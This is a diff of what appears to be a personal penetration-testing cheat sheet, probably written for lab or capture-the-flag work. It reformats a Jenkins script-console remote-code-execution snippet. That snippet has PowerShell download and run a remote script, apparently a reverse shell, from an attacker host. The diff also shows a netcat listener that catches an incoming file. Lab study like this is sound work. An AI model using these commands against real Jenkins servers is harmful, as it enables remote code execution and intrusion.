@@ -29,6 +29,6 @@ Collection of pain in the ass commands which take a bit of googling to find the 
 - nc -lvp 9001 > bank-account.zip 
 
 ```jenkins RCE```
-`def command = "powershell -c IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/tcp.ps1')" 
-def proc = command.execute() 
-println(proc.in.text)`
+- def command = "powershell -c IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/tcp.ps1')" 
+- def proc = command.execute() 
+- println(proc.in.text)
